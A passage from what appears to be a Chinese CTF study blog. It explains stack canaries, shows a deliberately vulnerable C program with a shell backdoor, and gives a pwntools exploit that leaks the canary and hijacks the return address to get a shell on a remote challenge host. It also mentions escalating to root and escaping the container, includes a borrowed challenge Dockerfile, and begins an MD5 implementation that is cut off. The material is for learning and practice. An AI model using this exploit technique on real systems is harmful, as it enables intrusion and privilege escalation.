的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p></blockquote><p>Canary的保护机制会在编译程序时自动在可能发生溢出的栈帧底部插入一个值（x86-64下是8字节），函数返回之时检测这个值是否发生了改变，以此来判断缓冲区溢出是否发生。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">^ Low (Towards <span class="built_in">which</span></span><br><span class="line">|      stack grows)</span><br><span class="line">| </span><br><span class="line">|  +------------+</span><br><span class="line">|  |   buffer   |</span><br><span class="line">|  |   canary   |</span><br><span class="line">|  |   old_bp   | &lt;- bp</span><br><span class="line">|  |   retaddr  |</span><br><span class="line">|  +------------+</span><br><span class="line">| </span><br><span class="line">v High</span><br></pre></td></tr></table></figure><p>如果缓冲区buffer的尾巴和canary是紧挨着的，并且可以用puts等函数读取缓冲区，那么canary有可能会被连带着一起读出来。因此canary的最低字节被固定为0。<br>checksec的结果中显示Canary found说明程序中存在Canary保护。<br>程序源码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDIN_FILENO 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDOUT_FILENO 1</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">setvbuf</span>(stderr, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">init</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Your name: &quot;</span>);</span><br><span class="line"><span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, %s. Introduce yourself: &quot;</span>, buf);</span><br><span class="line"><span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Bye.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好,现在我来讲解为什么我们需要绕过Canary:<br>我们构造栈溢出的本质是劫持 <em>main</em> 函数让地址最终指向我们想要的地址.<br>而Canary也是在main函数结束的地点进行一次检查.所以在前期我们可以肆意RE,只要最后把Canary的值搞到,最后交代上去,就不会有人发现.<br>所以我们第一次可以询问一个刚好RE的值盖住Canary的最低位,最后补齐即可.脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;202.198.27.90&#x27;</span>,<span class="number">40164</span>)  <span class="comment"># 打远程时替换</span></span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x40123b</span></span><br><span class="line">ret_addr = <span class="number">0x40123a</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">265</span></span><br><span class="line">p.send(payload1)  <span class="comment"># 不用换行，读满 256</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Hello, &#x27;</span>)</span><br><span class="line">res=p.recvuntil(<span class="string">b&#x27;. Introduce yourself:&#x27;</span>)</span><br><span class="line">rres=<span class="built_in">bytes</span>(<span class="number">1</span>)+res[<span class="number">265</span>:<span class="number">272</span>]</span><br><span class="line"><span class="built_in">print</span>(rres)</span><br><span class="line">pay=<span class="string">b&#x27;A&#x27;</span>*<span class="number">264</span>+rres+<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+p64(ret_addr)+p64(backdoor_addr)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Ex-拿到靶机的sh之后我们能干什么喵…">Ex. 拿到靶机的sh之后我们能干什么喵…</h2><ol><li><p>获取flag.</p></li><li><p>尝试提权(root),然后尝试逃逸</p></li></ol><h1>Remote</h1><p>不太会用docker自己造密码题,只好借鉴一下别人的是怎么写的</p><h2 id="1"><a href="https://ctf.cnsc.com.vn/">1</a></h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">22.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update -q \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -q -y --no-install-recommends \</span></span><br><span class="line"><span class="language-bash">        build-essential \</span></span><br><span class="line"><span class="language-bash">        libssl-dev \</span></span><br><span class="line"><span class="language-bash">        socat \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get clean \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m signing</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/signing</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src/ .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gcc -o chall chall.c rsa.c prime.c base85.c -lcrypto</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:signing /home/signing \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> -R 750 /home/signing \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> 740 flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> signing</span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> socat -T 60 -d -d TCP-LISTEN:1337,reuseaddr,fork EXEC:<span class="string">&#x27;./chall&#x27;</span></span></span><br></pre></td></tr></table></figure><h1>CTF板子</h1><h2 id="md5">md5</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> MD5 &#123;</span><br><span class="line">    <span class="comment">// 常量定义 - MD5算法的标准常量</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Constants</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 每次处理的数据块大小（字节）</span></span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> <span class="type">size_t</span> BLOCK_SIZE;</span><br><span class="line">        <span class="comment">// MD5初始状态（小端序）</span></span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> INIT_A;</span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> INIT_B;</span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> INIT_C;</span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> INIT_D;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 正弦函数的整数部分，用于每轮运算</span></span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> std::array&lt;<span class="type">uint32_t</span>, 64&gt; K;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 每轮左循环移位的位数</span></span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> std::array&lt;<span class="type">uint32_t</span>, 64&gt; S;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在类外定义静态常量成员</span></span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> Constants::BLOCK_SIZE = <span class="number">64</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> Constants::INIT_A = <span class="number">0x67452301</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> Constants::INIT_B = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> Constants::INIT_C = <span class="number">0x98BADCFE</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> Constants::INIT_D = <span class="number">0x10325476</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> std::array&lt;<span class="type">uint32_t</span>, 64&gt; Constants::K = &#123;</span><br><span class="line">        <span class="number">0xd76aa478</span>, <span class="number">0xe8c7b756</span>, <span class="number">0x242070db</span>, <span class="number">0xc1bdceee</span>,</span><br><span class="line">        <span class="number">0xf57c0faf</span>, <span class="number">0x4787c62a</span>, <span class="number">0xa8304613</span>, <span class="number">0xfd469501</span>,</span><br><span class="line">        <span class="number">0x698098d8</span>, <span class="number">0x8b44f7af</span>, <span class="number">0xffff5bb1</span>, <span class="number">0x895cd7be</span>,</span><br><span class="line">        <span class="number">0x6b901122</span>, <span class="number">0xfd987193</span>, <span class="number">0xa679438e</span>, <span class="number">0x49b40821</span>,</span><br><span class="line">        <span class="number">0xf61e2562</span>, <span class="number">0xc040b340</span>, <span class="number">0x265e5a51</span>, <span class="number">0xe9b6c7aa</span>,</span><br><span class="line">        <span class="number">0xd62f105d</span>, <span class="number">0x02441453</span>, <span class="number">0xd8a1e681</span>, <span class="number">0xe7d3fbc8</span>,</span><br><span class="line">        <span class="number">0x21e1cde6</span>, <span class="number">0xc33707d6</span>, <span class="number">0xf4d50d87</span>, <span class="number">0x455a14ed</span>,</span><br><span class="line">        <span class="number">0xa9e3e905</span>, <span class="number">0xfcefa3f8</span>, <span class="number">0x676f02d9</span>, <span class="number">0x8d2a4c8a</span>,</span><br><span class="line">        <span class="number">0xfffa3942</span>, <span class="number">0x8771f681</span>, <span class="number">0x6d9d6122</span>, <span class="number">0xfde5380c</span>,</span><br><span class="line">        <span class="number">0xa4beea44</span>, <span class="number">0x4bdecfa9</span>, <span class="number">0xf6bb4b60</span>, <span class="number">0xbebfbc70</span>,</span><br><span class="line">        <span class="number">0x289b7ec6</span>, <span class="number">0xeaa127fa</span>, <span class="number">0xd4ef3085</span>, <span class="number">0x04881d05</span>,</span><br><span class="line">        <span class="number">0xd9d4d039</span>, <span class="number">0xe6db99e5</span>, <span class="number">0x1fa27cf8</span>, <span class="number">0xc4ac5665</span>,</span><br><span class="line">        <span class="number">0xf4292244</span>, <span class="number">0x432aff97</span>, <span class="number">0xab9423a7</span>, <span class="number">0xfc93a039</span>,</span><br><span class="line">        <span class="number">0x655b59c3</span>, <span class="number">0x8f0ccc92</span>, <span class="number">0xffeff47d</span>, <span class="number">0x85845dd1</span>,</span><br><span class="line">        <span class="number">0x6fa87e4f</span>, <span class="number">0xfe2ce6e0</span>, <span class="number">0xa3014314</span>, <span class="number">0x4e0811a1</span>,</span><br><span class="line">        <span class="number">0xf7537e82</span>, <span class="number">0xbd3af235</span>, <span class="number">0x2ad7d2bb</span>, <span class="number">0xeb86d391</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> std::array&lt;<span class="type">uint32_t</span>, 64&gt; Constants::S = &#123;</span><br><span class="line">        <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">        <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">        <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 辅助函数：左旋转</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">left_rotate</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">uint32_t</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 辅助函数：字节顺序转换（小端序）</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">to_little_endian</span><span class="params">(<span class="type">uint32_t</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ((x &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">               ((x &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">               ((x &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">8</span>) |</span><br><span class="line">               ((x &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// MD5算法核心的四个非线性函数（F, G, H, I）</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">F</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">uint32_t</span> y, <span class="type">uint32_t</span> z)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (x &amp; y) | (~x &amp; z);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">G</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">uint32_t</span> y, <span class="type">uint32_t</span> z)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (x &amp; z) | (y &amp; ~z);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">H</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">uint32_t</span> y, <span class="type">uint32_t</span> z)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x ^ y ^ z;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">I</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">uint32_t</span> y, <span class="type">uint32_t</span> z)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> y ^ (x | ~z);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理单个64字节数据块</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">process_block</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* block, <span class="type">uint32_t</span>&amp; a, <span class="type">uint32_t</span>&amp; b, <span class="type">uint32_t</span>&amp; c, <span class="type">uint32_t</span>&amp; d)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 将64字节块转换为16个32位字</span></span><br><span class="line">        <span class="type">uint32_t</span> M[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">            M[i] = (block[i * <span class="number">4</span>]) |</span><br><span class="line">                   (block[i * <span class="number">4</span> + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">                   (block[i * <span class="number">4</span> + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">                   (block[i * <span class="number">4</span> + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 保存初始哈希值</span></span><br><span class="line">        <span class="type">uint32_t</span> AA = a;</span><br><span class="line">        <span class="type">uint32_t</span> BB = b;</span><br><span class="line">        <span class="type">uint32_t</span> CC = c;</span><br><span class="line">        <span class="type">uint32_t</span> DD = d;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 第一轮：F函数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> f = <span class="built_in">F</span>(b, c, d);</span><br><span class="line">            <span class="type">uint32_t</span> g = i;</span><br><span class="line">            </span><br><span class="line">            <span class="type">uint32_t</span> temp = d;</span><br><span class="line">            d = c;</span><br><span class="line">            c = b;</span><br><span class="line">            b = b + <span class="built_in">left_rotate</span>((a + f + Constants::K[i] + M[g]), Constants::S[i]);</span><br><span class="line">            a = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 第二轮：G函数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">16</span>; i &lt; <span class="number">32</span>; ++i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> f = <span class="built_in">G</span>(b, c, d);</span><br><span class="line">            <span class="type">uint32_t</span> g = (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="type">uint32_t</span> temp = d;</span><br><span class="line">            d = c;</span><br><span class="line">            c = b;</span><br><span class="line">            b = b + <span class="built_in">left_rotate</span>((a + f + Constants::K[i] + M[g]), Constants::S[i]);</span><br><span class="line">            a = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 第三轮：H函数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">32</span>; i &lt; <span class="number">48</span>; ++i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> f = <span class="built_in">H</span>(b, c, d);</span><br><span class="line">            <span class="type">uint32_t</span> g = (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="type">uint32_t</span> temp = d;</span><br><span class="line">            d = c;</span><br><span class="line">            c = b;</span><br><span class="line">            b = b + <span class="built_in">left_rotate</span>((a + f + Constants::K[i] + M[g]), Constants::S[i]);</span><br><span class="line">            a = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 第四轮：I函数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">48</span>; i &lt; <span class="number">64</span>; ++i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> f = <span class="built_in">I</span>(b, c, d);</span><br><span class="line">            <span class="type">uint32_t</span> g = (<span class="number">7</span> * i) % <span class="number">16</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="type">uint32_t</span> temp = d;</span><br><span class="line">            d = c;</span><br><span class="line">            c = b;</span><br><span class="line">            b = b + <span class="built_in">left_rotate</span>((a + f + Constants::K[i] + M[g]), Constants::S[i]);</span><br><span class="line">            a = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 加到原来的结果上</span></span><br><span class="line">        a += AA;</span><br><span class="line">        b += BB;</span><br><span class="line">        c += CC;</span><br><span class="line">        d += DD;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将32位整数转换为16进制字符串</span></span><br><span class="line">    <span class="function"><span class="type">static</span> std::string <span class="title">uint32_to_hex</span><span class="params">(<span class="type">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">        std::stringstream ss;</span><br><span class="line">        ss &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="comment">// MD5输出是小端序，但十六进制字符串通常显示为大端序</span></span><br><span class="line">        <span class="comment">// 所以需要调整字节顺序</span></span><br><span class="line">        value = <span class="built_in">to_little_endian</span>(value);</span><br><span class="line">        ss &lt;&lt; value;</span><br><span class="line">        <span class="keyword">return</span> ss.<span class="built_in">str</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 主要的MD5加密函数</span></span><br><span class="line">    <span class="function">std::string <span class="title">encrypt</span><span class="params">(<span class="type">const</span> std::string&amp; input)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 初始化MD5缓冲区（小端序）</span></span><br><span class="line">        <span class="type">uint32_t</span> a = Constants::INIT_A;</span><br><span class="line">        <span class="type">uint32_t</span> b = Constants::INIT_B;</span><br><span class="line">        <span class="type">uint32_t</span> c = Constants::INIT_C;</span><br><span class="line">        <span class="type">uint32_t</span> d = Constants::INIT_D;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 原始消息长度（字节）</span></span><br><span class="line">        <span class="type">uint64_t</span> original_length = input.<span class="built_in">length</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算填充后的长度</span></span><br><span class="line">        <span class="comment">// 消息需要填充到 448 mod 512 位（56 mod 64 字节）</span></span><br><span class="line">        <span class="type">size_t</span> padded_length = ((original_length + <span class="number">8</span>) / <span class="number">64</span> + <span class="number">1</span>) * <span class="number">64</span>;</span><br><span class="line">        <span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">padded_message</span><span class="params">(padded_length, <span class="number">0</span>)</span></span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 复制原始消息</span></span><br><span class="line">        std::<span class="built_in">copy</span>(input.<span class="built_in">begin</span>(), input.<span 